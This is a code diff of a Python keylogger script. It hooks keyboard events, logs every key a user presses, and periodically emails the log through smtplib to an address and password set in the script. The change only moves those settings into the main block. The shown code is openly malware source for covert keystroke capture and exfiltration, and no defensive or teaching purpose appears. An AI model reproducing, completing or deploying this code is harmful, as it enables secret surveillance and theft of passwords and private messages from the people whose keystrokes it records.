@@ -2,12 +2,6 @@ import keyboard
 import smtplib
 from threading import Semaphore, Timer
 
-
-SEND_REPORT_EVERY = 20
-EMAIL_ADDRESS = "put_real_address_here@gmail.com"
-EMAIL_PASSWORD = "put_real_pw"
-
-
 class Keylogger:
     def __init__(self, interval):
         self.interval = interval
@@ -33,7 +27,6 @@ class Keylogger:
             else:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
-
         self.log += name
 
     def sendmail(self, email, password, message):
@@ -56,9 +49,11 @@ class Keylogger:
     def start(self):
         keyboard.on_release(callback=self.callback)
         self.report()
-
         self.semaphore.acquire()
 
 if __name__ == "__main__":
+    SEND_REPORT_EVERY = 20
+    EMAIL_ADDRESS = "put_real_address_here@gmail.com"
+    EMAIL_PASSWORD = "put_real_pw"
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
